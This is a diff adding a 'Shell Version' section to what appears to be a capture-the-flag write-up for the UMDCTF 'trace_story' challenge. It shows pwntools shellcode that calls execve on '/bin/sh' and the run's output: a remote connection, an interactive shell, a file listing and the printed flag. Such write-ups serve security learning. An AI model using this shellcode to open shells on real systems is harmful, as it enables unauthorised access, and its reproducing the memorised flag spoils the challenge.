@@ -563,3 +563,45 @@ UMDCTF{Tr4C3_Thr0Ugh_3v3rYth1NG}
 ```
 
 Retrying until even PID.
+
+
+### Shell Version
+
+```python
+patch = asm(
+f'''
+mov rdi, {binary.search(b'readstory.txt').__next__()}
+xor rsi, rsi
+xor rdx, rdx
+mov rax, {constants.SYS_execve}
+syscall
+''')
+```
+
+Payload is just changed to get a shell using `execve`.
+
+Instead of `flag` replacing `readstory.txt`, it's `/bin/sh`.
+
+See [`exploit2.py`](exploit2.py) for details.
+
+Output:
+
+```
+# ./exploit2.py REMOTE=1
+[+] Opening connection to 0.cloud.chals.io on port 15148: Done
+[*] child pid: 1232
+[*] Switching to interactive mode
+$ ls -l
+total 56
+drwxr-x--- 1 0 1000  4096 Mar  3 03:26 bin
+drwxr-x--- 1 0 1000  4096 Mar  3 03:26 dev
+-rwxr----- 1 0 1000    32 Mar  3 03:22 flag
+drwxr-x--- 1 0 1000  4096 Mar  3 03:26 lib
+drwxr-x--- 1 0 1000  4096 Mar  3 03:26 lib32
+drwxr-x--- 1 0 1000  4096 Mar  3 03:26 lib64
+drwxr-x--- 1 0 1000  4096 Mar  3 03:26 libx32
+-rwxr-x--- 1 0 1000  5628 Mar  3 12:12 readstory.txt
+-rwxr-x--- 1 0 1000 17712 Mar  3 03:22 trace_story
+$ cat flag
+UMDCTF{Tr4C3_Thr0Ugh_3v3rYth1NG}
+```
